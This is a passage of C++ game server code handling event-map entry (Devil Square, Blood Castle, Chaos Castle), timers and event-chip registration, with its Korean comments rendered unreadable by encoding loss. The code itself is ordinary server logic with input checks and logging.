	pMsg.Flag		= flag;
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


//////////////////////////////////////////////////////////////////////////////
// [0x29] ������ ������� ���� Ư�� �ɷ� �ð� �˸�
void GCItemUseSpecialTimeSend(int aIndex, BYTE number, int time)
{
	PMSG_ITEMUSESPECIALTIME	pMsg;

	if( time > 65535 ) time = 65535;

	PHeadSetBE((LPBYTE)&pMsg, 0x29, sizeof( pMsg ));
	pMsg.Number     = number;
	pMsg.Time       = (WORD)time;
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


//////////////////////////////////////////////////////////////////////////////
// [0x2A] Ư�� �������� �������� �˸���.
void GCItemDurSend(int aIndex, BYTE pos, BYTE dur, BYTE flag)
{
	PMSG_ITEMDUR	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x2A, sizeof( pMsg ));
	pMsg.IPos       = pos;
	pMsg.Dur		= dur;
	pMsg.Flag		= flag;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//////////////////////////////////////////////////////////////////////////////
// [0x2A] Ư�� �������� �������� �˸���.(5�� �����)
void GCItemDurSend2(int aIndex, BYTE pos, BYTE dur, BYTE flag)
{
#ifdef DURABILITY_DOWN_CHANGE	// ������ ���� ��� ����(������������ �ƴ�, �ʴ�)
	if( dur > 5 && (dur%5 != 0) )
	{	// 5�� ����� �������� �����Ѵ�
		return;
	}
#endif
	PMSG_ITEMDUR	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x2A, sizeof( pMsg ));
	pMsg.IPos       = pos;
	pMsg.Dur		= dur;
	pMsg.Flag		= flag;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//////////////////////////////////////////////////////////////////////////////
// [0x0F] ������ ��ȭ�� �˸���.
void CGWeatherSend(int aIndex, BYTE weather)
{
	PMSG_WEATHER	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0F, sizeof( pMsg ));
	pMsg.Weather    = weather;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// [0xF3] [0x40] ���� ��ɾ ������
void GCServerCmd(int aIndex, BYTE type, BYTE Cmd1, BYTE Cmd2)
{
	PMSG_SERVERCMD	ServerCmd;
	PHeadSubSetB((LPBYTE)&ServerCmd, 0xF3, 0x40, sizeof(ServerCmd));			

	ServerCmd.CmdType = type;
	ServerCmd.X = Cmd1;
	ServerCmd.Y = Cmd2;

	DataSend(aIndex, (LPBYTE)&ServerCmd, ServerCmd.h.size);
}

// [0x90] �������� �̵��� ��û�Ѵ�
void GCReqmoveDevilSquare(LPPMSG_REQ_MOVEDEVILSQUARE lpMsg, int aIndex)
{
	if( aIndex < 0  || aIndex > MAX_OBJECT-1 ) 
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}	

	BYTE cSquareNumber = lpMsg->SquareNumber;
	BYTE cInvitationItemPos = lpMsg->InvitationItemPos-12;

#ifdef BLOOD_DEVILSQUARE_TRADE_BUG_FIX
	// *> . ���� �������̽��� ��� ������ üũ�Ѵ�.
	if (gObj[aIndex].m_IfState.use != 0 && gObj[aIndex].m_IfState.type != I_ETCWINDOW ) {
		return;
	}
#endif

	PMSG_RESULT_MOVEDEVILSQUARE pResult;
	PHeadSetB((LPBYTE)&pResult, 0x90, sizeof(pResult));
	pResult.Result = 0;		

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	LogAddTD("[DevilSquare] [%s][%s] Request Move DevilSquare [%d][%d][%d]", 
		   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);

#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
	// ī�� ������ ������ �� ����.
#ifdef UPDATE_PK_SYSTEM_20070302	// ī�� ������ ������ �� ����.
			BOOL	PKFlag = FALSE;
			if(lpObj->PartyNumber >= 0)	// ��Ƽ�� ���Ұ��
			{
				if( gParty.GetPKPartyPenalty(lpObj->PartyNumber) >= PK_LEVEL_DEFAULT+2)
				{
					PKFlag = TRUE;
				}
			}
			else
			{
				if(lpObj->m_PK_Level >= PK_LEVEL_DEFAULT+1)
				{
					PKFlag = TRUE;
				}
			}
			
			if(PKFlag == TRUE)
#else	// UPDATE_PK_SYSTEM_20070302
	if( gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT + 1 )
#endif	// UPDATE_PK_SYSTEM_20070302
	{
		pResult.Result = 6;
		DataSend( aIndex, (LPBYTE)&pResult, pResult.h.size );
		return;
	}
#endif
	
	if( !CHECK_LIMIT(cInvitationItemPos, MAX_INVENTORY) )
	{	// �������� ����
		pResult.Result = 1;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]", 
			   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);
		return;
	}

	if( !CHECK_LIMIT(cSquareNumber, MAX_DEVILSQUARE) )
	{	// ���� ��ȣ�� �߸��Ǿ���
		pResult.Result = 1;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]", 
			   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);
		return;
	}

	if( g_DevilSquare.GetState() != DevilSquare_OPEN )
	{	// ���� ��� ���� �ִ� �ð��� �ƴϴ�
		pResult.Result = 2;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]", 
			   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);
		return;
	}

	if( g_DevilSquare.m_DevilSquareGround[cSquareNumber].GetObjCount() >= MAX_DEVILSQUARE_OBJCOUNT )
	{	// ���� ���� �ο����� �Ѿ���
		pResult.Result = 5;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]", 
			   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);
		return;
	}
	
	CItem* sitem = &lpObj->pInventory[cInvitationItemPos];		

	if( sitem->m_Type != MAKE_ITEMNUM(14, 19)
#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
		// �Ǹ��� ���� ���� �����
		&& ( sitem->m_Type != MAKE_ITEMNUM( 13, 46 ) || sitem->m_Durability <= 0 )
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
		)
	{	// �������� ����
		pResult.Result = 1;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]", 
			   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);
		return;
	}

#ifdef DEVILSQUARE_CHECK_ENTERCOUNT_20040715
	// ���������� ����Ƚ�� ���뿡 ���� ����ó�� ���� -> ��ŷ ������ ������ ���������� �����Ѵ�.
	BOOL bRET_VAL = EGReqDevilSquareEnterCountCheck	(aIndex, cInvitationItemPos, sitem->m_Level, lpMsg->SquareNumber);
	if (bRET_VAL == TRUE)		// ��û�� ���������� �ϴ� ����������.
		return;

	// ���ж�� ���� ������ ��� �Ѵ�.
#endif

	int	ItemLevel = sitem->m_Level;

#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
	if( sitem->m_Type == MAKE_ITEMNUM( 13, 46 ) )
	{
		ItemLevel = 10;
	}
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110

	int level = lpObj->Level;

#ifdef DARKLORD_WORK
	if( lpObj->Class == CLASS_DARKLORD || lpObj->Class == CLASS_MAGUMSA )	
#else
	if( lpObj->Class == CLASS_MAGUMSA )	
#endif
	{	// ���˻�� ������ 3/2���� �ø���
		level = (((level+1)/2)*3);
	}	

	if( ItemLevel != 0 )
	{
#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
		if( ItemLevel != 10 )		// �������� ���� ����������̸�
		{
			if( ItemLevel != cSquareNumber+1 )
			{	// �ʴ���� ������ �������� ���� ��ȣ�� �� �ؾ� �ȴ�
				pResult.Result = 1;
				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Invitation LevelError [%d][%d][%d][%d]", 
					   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1, ItemLevel);
				return;
			}
		}
#else
		if( ItemLevel != cSquareNumber+1 )
		{	// �ʴ���� ������ �������� ���� ��ȣ�� �� �ؾ� �ȴ�
			pResult.Result = 1;
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Invitation LevelError [%d][%d][%d][%d]", 
				   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1, ItemLevel);
			return;
		}
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
	}

	BOOL bEnterCheck = 0;	// 0�̸� ���尡�� 1�̸� �ڽ��� �������� ���� ���� ������ �Ҷ� 
							// 2�� �ڽ��� �������� ���� ���� ������ �Ҷ�

#ifdef ADD_DEVILSQURE_FOR_MASTER_LEVEL_20071010
	INT movegateindex = 61;
#else
	BYTE movegateindex = 61;
#endif

#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� ���巹�� üũ
	INT iENTER_LEVEL = g_DevilSquare.GetUserLevelToEnter(aIndex, movegateindex);
	if (!CHECK_DEVILSQUARE_INDEX(iENTER_LEVEL)) {
		LogAddTD("[DevilSquare] [%s][%s] GetUserLevelToEnter() failed", 
			   lpObj->AccountID, 
			   lpObj->Name
			   );
		return;
	}

#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
	if( ItemLevel == 10 )			// ���� ���� ������� ��� �� ���
	{
		// ����ڰ� ���� ������ ������ �����Ѵ�.
		cSquareNumber = iENTER_LEVEL;
	}
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110

	if (cSquareNumber != iENTER_LEVEL) {
		if (cSquareNumber > iENTER_LEVEL) {
			// ������ �ϴ� ���� ������ ����
			bEnterCheck	= 2;
		}
		else {
			// ������ �ϴ� ���� ������ ����
			bEnterCheck	= 1;
		}
	}
#else
	if( cSquareNumber == 0 )
	{	// 1����
		if( level >= 100 )
		{
			bEnterCheck = 1;
		}

		if( level < 10 )
		{
			bEnterCheck = 2;
		}
		movegateindex = 58;
	}
	else if( cSquareNumber == 1 )
	{	// 2����
		if( level >= 180 )
		{
			bEnterCheck = 1;
		}
		else if( level < 100 )
		{
			bEnterCheck = 2;
		}
		movegateindex = 59;
	}
	else if( cSquareNumber == 2 )
	{	// 3����
		if( level >= 250 )
		{
			bEnterCheck = 1;
		}
		else if( level < 180 )
		{
			bEnterCheck = 2;
		}
		movegateindex = 60;
	}
	else
	{		
		if( level < 250 )
		{	// 250 ������.. ���������� �Ѵܰ� ���� �����ϴ�
			bEnterCheck = 2;
		}
	}
#endif
	
	if( bEnterCheck == 1)
	{
		pResult.Result = 3;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d][%d]", 
			   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber, ItemLevel);
		return;
	}
	else if( bEnterCheck == 2)
	{
		pResult.Result = 4;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d][%d]", 
			   lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber, ItemLevel);
		return;
	}

#ifdef AUTH_GAMESERVER_CHECKKEY
	if( szAuthKey[6] != AUTH_CHECK_06 )
		DestroyGIocp();
#endif

#ifdef EXTEND_LOG_SYSTEM_06_20070308
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
	LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare success [%d][%d] RemoveItem[%s][%d][%d][%u], PCRoom:%d", 
	#else
	LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare success [%d][%d] RemoveItem[%s][%d][%d][%d], PCRoom:%d", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
			lpObj->AccountID, lpObj->Name, lpObj->Level, cSquareNumber,
			lpObj->pInventory[cInvitationItemPos].GetName(), cInvitationItemPos, ItemLevel, lpObj->pInventory[cInvitationItemPos].m_Number,
			lpObj->m_bPCBangUser);
#else
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
	LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare success [%d][%d] RemoveItem[%s][%d][%d][%u]", 
	#else
	LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare success [%d][%d] RemoveItem[%s][%d][%d][%d]", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
			lpObj->AccountID, lpObj->Name, lpObj->Level, cSquareNumber,
			lpObj->pInventory[cInvitationItemPos].GetName(), cInvitationItemPos, ItemLevel, lpObj->pInventory[cInvitationItemPos].m_Number);
#endif // EXTEND_LOG_SYSTEM_06_20070308
	
	// ����
#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
	if( sitem->m_Type == MAKE_ITEMNUM( 14, 19 )
		// �Ǹ��� ���� ���� �����
		|| ( sitem->m_Type == MAKE_ITEMNUM( 13, 46 ) && sitem->m_Durability == 1 )
	  )
	{
		gObjInventoryDeleteItem(aIndex, cInvitationItemPos);
		GCInventoryItemDeleteSend(aIndex, cInvitationItemPos, 1);
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);	
	}
	else if( sitem->m_Type == MAKE_ITEMNUM( 13, 46 ) && sitem->m_Durability > 1 )
	{
		sitem->m_Durability--;

		GCItemDurSend2( lpObj->m_Index, cInvitationItemPos, sitem->m_Durability, 0 );
	}
#else
	gObjInventoryDeleteItem(aIndex, cInvitationItemPos);
	GCInventoryItemDeleteSend(aIndex, cInvitationItemPos, 1);
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);	
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110

	// �Ǹ��� ���� ������ �ʱ�ȭ�Ѵ�	
	lpObj->m_nEventExp = 0;
	lpObj->m_nEventScore = 0;
	lpObj->m_nEventMoney = 0;
#ifdef DEVILSQUARE_EXTEND_20050221
	lpObj->m_bDevilSquareIndex = g_DevilSquare.GetDevilSquareIndex(movegateindex);
#else
	lpObj->m_bDevilSquareIndex = movegateindex - 58;
#endif

	lpObj->m_bDevilSquareAuth = TRUE;

	
#ifdef BLOOD_DEVILSQUARE_TRADE_BUG_FIX
	lpObj->m_IfState.state = 0;	
	lpObj->m_IfState.type = 0;
	lpObj->m_IfState.use =  0;
#endif

	// �Ǹ��� �������� ������
	gObjMoveGate(lpObj->m_Index, movegateindex);	

	// ���� �ο��� �߰�
	g_DevilSquare.m_DevilSquareGround[cSquareNumber].IncObjCount();
}

// [0x91] ������½ð� ��û
void GCReqDevilSquareRemainTime(LPPMSG_REQ_DEVILSQUARE_REMAINTIME lpMsg, int aIndex)
{
	PMSG_RESULT_DEVILSQUARE_REMAINTIME pResult;	PHeadSetB((LPBYTE)&pResult, 0x91, sizeof(pResult));
	pResult.RemainTime = 0;

#ifdef UPDATE_PK_SYSTEM_20070302
	BOOL	PKFlag = FALSE;
#endif

#ifdef FOR_BLOODCASTLE
	switch (lpMsg->hEventType) {

	case 1 :	// ����������
#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
		// ī�� ������ ������ �� ����.
		if( gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT + 1 )
		{	
			GCServerCmd( aIndex, MSGBOX_ENTERLIMIT_PKUSER_DEVILSQURE, 0, 0 );
			LogAddTD( "[PK User][DevilSquare] [%s][%s] Move Fail [PK Level:%d]", 
			   gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_PK_Level );			
			return;
		}			
		else
		{
#endif		
			pResult.hEventType = 1;
			if( g_DevilSquare.GetState() == DevilSquare_CLOSE )
			{	// ����������, ���� �ð� ����
				pResult.RemainTime = g_DevilSquare.GetRemainTime();
			}
			else if( g_DevilSquare.GetState() == DevilSquare_OPEN )
			{
				pResult.RemainTime = 0x00;
			}
			else
			{
#ifdef UPDATE_DEVIL_SQUARE_START_TIME_20070511	// �������ϰ�� �����ð�
				pResult.RemainTime = g_DevilSquare.GetNextRemainTime();
#else
				pResult.RemainTime = g_DevilSquare.GetRemainTime()+g_DevilSquare.m_iCloseTime;
#endif
			}
#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
		}
#endif		
		break;

	case 2 :	// ���� ĳ��
#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
		// ī�� ������ ������ �� ����.
		if( gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT + 1 )
		{	
			GCServerCmd( aIndex, MSGBOX_ENTERLIMIT_PKUSER_BLOODCASTLE, 0, 0 );
			LogAddTD( "[PK User][BloodCastle] [%s][%s] Move Fail [PK Level:%d]", 
			   gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_PK_Level );
			return;
		}			
		else
		{
#endif
			pResult.hEventType = 2;
			if ( g_BloodCastle.GetCurrentState(lpMsg->btItemLevel-1) == BLOODCASTLE_STATE_CLOSED) {	// �� �� ���� �̵��� ���� �ð��� ���� ??
				if (g_BloodCastle.CheckCanEnter(lpMsg->btItemLevel-1))
					pResult.RemainTime = 0x00;
				else
					pResult.RemainTime = g_BloodCastle.GetRemainTime(lpMsg->btItemLevel-1);
			}
			else {
				pResult.RemainTime = g_BloodCastle.GetRemainTime(lpMsg->btItemLevel-1);
			}
#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
		}
#endif		
		break;
#ifdef CHAOSCASTLE_SYSTEM_20040408		// ī���� ĳ�� ���� �ð� ����
	case 4 :	// ī���� ĳ��
		{
#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
		// ī�� ������ ������ �� ����.
		if( gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT + 1 )
		{	
			GCServerCmd( aIndex, MSGBOX_ENTERLIMIT_PKUSER_CHAOSCASTLE, 0, 0 );
			LogAddTD( "[PK User][ChaosCastle] [%s][%s] Move Fail [PK Level:%d]", 
			   gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_PK_Level );
			return;
		}			
		else
		{
#endif			
			// 1 . �ڽ��� ������ �´� �𵥵� ĳ���� ã�´�.
			INT iENTER_LEVEL = g_ChaosCastle.GetUserLevelToEnter(aIndex);
			if (iENTER_LEVEL == -1) {
				return;
			}
			else {
				pResult.hEventType = 4;
				if ( g_ChaosCastle.GetCurrentState(iENTER_LEVEL) == CHAOSCASTLE_STATE_CLOSED) {	// �� �� ĳ�� �̵��� ���� �ð��� ���� ??
#ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
					if (g_ChaosCastle.CheckCanEnter( aIndex, iENTER_LEVEL)) {
#else
					if (g_ChaosCastle.CheckCanEnter(iENTER_LEVEL)) {
#endif
						
#ifdef CHAOSCASTLE_TIME_BUGFIX_20040508
						pResult.RemainTime		= 0x00;
						
						//##BUGFIX MODIFY_OPENTIME_CHAOS_CASTLE_20041129
						pResult.RemainTime_LOW	= 0x00;
#else
						pResult.RemainTime		= 0x00;
#endif
						pResult.EnteredUser		= g_ChaosCastle.GetCurEnteredUser(iENTER_LEVEL);
					}
					else {
#ifdef CHAOSCASTLE_TIME_BUGFIX_20040508
	#ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
						WORD wREMAIN_TIME		= (WORD) g_ChaosCastle.GetRemainTime( aIndex, iENTER_LEVEL );
	#else
						WORD wREMAIN_TIME		= (WORD) g_ChaosCastle.GetRemainTime(iENTER_LEVEL);
	#endif	// #ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307						
						pResult.RemainTime		= HIBYTE((WORD) wREMAIN_TIME);
						pResult.RemainTime_LOW	= LOBYTE((WORD) wREMAIN_TIME);
#else
	#ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307						
						pResult.RemainTime		= (WORD) g_ChaosCastle.GetRemainTime( aIndex, iENTER_LEVEL );
	#else
						pResult.RemainTime		= (WORD) g_ChaosCastle.GetRemainTime(iENTER_LEVEL);
	#endif	// #ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307				
#endif
						pResult.EnteredUser		= g_ChaosCastle.GetCurEnteredUser(iENTER_LEVEL);
					}
				}
				else {
#ifdef CHAOSCASTLE_TIME_BUGFIX_20040508
	#ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
					WORD wREMAIN_TIME		= (WORD) g_ChaosCastle.GetRemainTime( aIndex, iENTER_LEVEL);
	#else
					WORD wREMAIN_TIME		= (WORD) g_ChaosCastle.GetRemainTime(iENTER_LEVEL);
	#endif	// #ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
					pResult.RemainTime		= HIBYTE((WORD) wREMAIN_TIME);
					pResult.RemainTime_LOW	= LOBYTE((WORD) wREMAIN_TIME);
#else
	#ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
					pResult.RemainTime		= (WORD) g_ChaosCastle.GetRemainTime( aIndex, iENTER_LEVEL );
	#else
					pResult.RemainTime		= (WORD) g_ChaosCastle.GetRemainTime(iENTER_LEVEL);
	#endif	// #ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307		
#endif
					pResult.EnteredUser		= g_ChaosCastle.GetCurEnteredUser(iENTER_LEVEL);
				}
			}
#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
		}
#endif				
		}
		break;
#endif

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ȯ������� �����ð��� ����
	case 5:	// ȯ�� ���
		{
			pResult.hEventType	= 5;
			pResult.RemainTime	= g_IllusionTempleEvent.GetRemainTime();
			pResult.EnteredUser	= 0;
			pResult.RemainTime_LOW	= 0;
		}
		break;	
#endif
	}
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);	

#else
	
	if( g_DevilSquare.GetState() == DevilSquare_CLOSE )
	{	// ����������, ���� �ð� ����
		pResult.RemainTime = g_DevilSquare.GetRemainTime();
	}
	else if( g_DevilSquare.GetState() == DevilSquare_OPEN )
	{
		pResult.RemainTime = 0x0;
	}
	else
	{
		pResult.RemainTime = g_DevilSquare.GetRemainTime()+g_DevilSquare.m_iCloseTime;
	}
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);	
#endif
}


void AllSendMsg(LPBYTE Msg, int size)
{
#ifdef FOR_BLOODCASTLE
	for( int n=ALLOC_USEROBJECTSTART; n<MAX_OBJECT; n++)
#else
	for( int n=0; n<MAX_OBJECT; n++)
#endif	
	{
		if( gObj[n].Connected == 3 && (gObj[n].Type == OBJTYPE_CHARACTER) )
		{
			DataSend(n, (LPBYTE)Msg, size);
		}
	}
}

void AllSendSameMapMsg(LPBYTE Msg, int size, BYTE mapnumber)
{
	for( int n=0; n<MAX_OBJECT; n++)
	{
		if( gObj[n].Connected == 3 && (gObj[n].Type == OBJTYPE_CHARACTER) && 
			gObj[n].MapNumber == mapnumber )
		{
			DataSend(n, (LPBYTE)Msg, size);
		}
	}
}

void GCSendPing(int aIndex)
{
	PMSG_PING pMsgPing;

	PHeadSetB((LPBYTE)&pMsgPing, 0x71, sizeof(pMsgPing));
	gObj[aIndex].iPingTime = GetTickCount();	
	DataSend(aIndex, (LPBYTE)&pMsgPing, pMsgPing.h.size);
}

void GCPingSendRecv(LPPMSG_PING_RESULT aRecv, int aIndex)
{	
	int PingTime = GetTickCount() - gObj[aIndex].iPingTime;
	LogAdd("[%s][%s] Ping = %d ms", gObj[aIndex].AccountID, gObj[aIndex].Name, PingTime);	
}

void GCRegEventChipRecv(LPPMSG_REGEVENTCHIP lpMsg, int aIndex)
{

#ifdef  FOR_BLOODCASTLE

	if (!CHECK_LIMIT(lpMsg->Type, 5))			// ���� Ȥ�� ���濡 ���� ��û�� �ƴ϶��
		return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

#ifdef BUGFIX_EVENT_CHIP_DUPLICATE_PREVENT_20050422
	// ���� �� �̺�ƮĨ ���� �õ� ���� �� �α� ���
	if( lpObj->m_IfState.type == I_TRADE ) // �ŷ� ������ ���
	{
		LogAddTD("[EventChip] [%s][%s] Attempted ItemCopy using Trade Window", lpObj->AccountID, lpObj->Name );
		return;
	}

	if( lpObj->m_IfState.type == I_CHAOSBOX ) // ī���� �ڽ� ���� ������ ��� 
	{
		LogAddTD("[EventChip] [%s][%s] Attempted ItemCopy using ChaosBox Window", lpObj->AccountID, lpObj->Name );
		return;
	}
#endif

	if( lpObj->UseEventServer ) {
		PMSG_REGEVENTCHIP_RESULT Result;
		PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));

		Result.ChipCount = -1;
		Result.Type = lpMsg->Type;
		LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) #1 %d", 
			   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);
		DataSend(aIndex, (LPBYTE)&Result, Result.h.size);		
		return;
	}

	int Pos = lpMsg->ChipPos+12;

	CItem* sitem = &lpObj->pInventory[Pos];	

	if( !sitem->IsItem() ) {
		PMSG_REGEVENTCHIP_RESULT Result;
		PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));

		Result.ChipCount = -1;
		Result.Type = lpMsg->Type;
		LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) #2 %d", 
			   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);
		DataSend(aIndex, (LPBYTE)&Result, Result.h.size);		
		return;
	}

	lpObj->UseEventServer = TRUE;

	switch (lpMsg->Type) {
	case 0 :		// ���� ��Ͽ�û
		{
			/*  ���� 
			if( (sitem->m_Type != MAKE_ITEMNUM(14, 21)) && (sitem->m_Level == 0) )
			{
				// �������� ����
				PMSG_REGEVENTCHIP_RESULT Result;
				PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));

				Result.ChipCount = -1;
				Result.Type = 0;
				LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) %d", 
					   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);
				DataSend(aIndex, (LPBYTE)&Result, Result.h.size);		
				lpObj->UseEventServer = FALSE;			
			}
			else
			{	
				PMSG_REQ_REGISTER_EVENTCHIP	pMsg;
				PHeadSetB((LPBYTE)&pMsg, 0x02, sizeof(pMsg));	

				pMsg.iINDEX = aIndex;
				pMsg.Pos = Pos;
				strcpy(pMsg.szUID, lpObj->AccountID);
				DataSendEventChip((char*)&pMsg, sizeof(pMsg));		
			}
			*/
			if( (sitem->m_Type == MAKE_ITEMNUM(14, 21)) && (sitem->m_Level == 0) )
			{
				PMSG_REQ_REGISTER_EVENTCHIP	pMsg;
				PHeadSetB((LPBYTE)&pMsg, 0x02, sizeof(pMsg));	

				pMsg.iINDEX = aIndex;
				pMsg.Pos = Pos;
				strcpy(pMsg.szUID, lpObj->AccountID);
				DataSendEventChip((char*)&pMsg, sizeof(pMsg));		

			}
			else
			{	// �������� ����
				PMSG_REGEVENTCHIP_RESULT Result;
				PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));

				Result.ChipCount = -1;
				Result.Type = 0;
				LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) #3 %d", 
					   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);
				DataSend(aIndex, (LPBYTE)&Result, Result.h.size);		
				lpObj->UseEventServer = FALSE;
			}
		}
		break;
	case 1 :		// ���� ��Ͽ�û
		{
			if( (sitem->m_Type == MAKE_ITEMNUM(14, 21)) && (sitem->m_Level == 1) )
			{
				PMSG_REQ_REGISTER_STONES	pMsg;
				PHeadSetB((LPBYTE)&pMsg, 0x06, sizeof(pMsg));	

				pMsg.iINDEX = aIndex;
				pMsg.iPosition = Pos;
				strcpy(pMsg.szUID, lpObj->AccountID);
				DataSendEventChip((char*)&pMsg, sizeof(pMsg));	
	
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[Stone] [%s][%s] Register Stone (Stone Pos:%d, Serial:%u)", 
#else
				LogAddTD("[Stone] [%s][%s] Register Stone (Stone Pos:%d, Serial:%d)", 
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos, sitem->m_Number);
			}
			else 
			{	// �������� ����
				PMSG_REGEVENTCHIP_RESULT Result;
				PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));

				Result.ChipCount = -1;
				Result.Type = 1;
				LogAddTD("[Stone] [%s][%s] Not Found EventChip (Stone Pos: %d)", 
					   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);
				DataSend(aIndex, (LPBYTE)&Result, Result.h.size);		
				lpObj->UseEventServer = FALSE;
			}
		}
		break;

#ifdef EVENT_STONE_OF_FRIENDSHIP_20040206
	case 4 :		// �����ǵ� ��Ͽ�û
		{
			if( (sitem->m_Type == MAKE_ITEMNUM(14, 21)) && (sitem->m_Level == 2) )
			{
				PMSG_REQ_REGISTER_FRIENDSHIP_STONES	pMsg;
				PHeadSetB((LPBYTE)&pMsg, 0x12, sizeof(pMsg));	

				pMsg.iINDEX = aIndex;
				pMsg.iPosition = Pos;
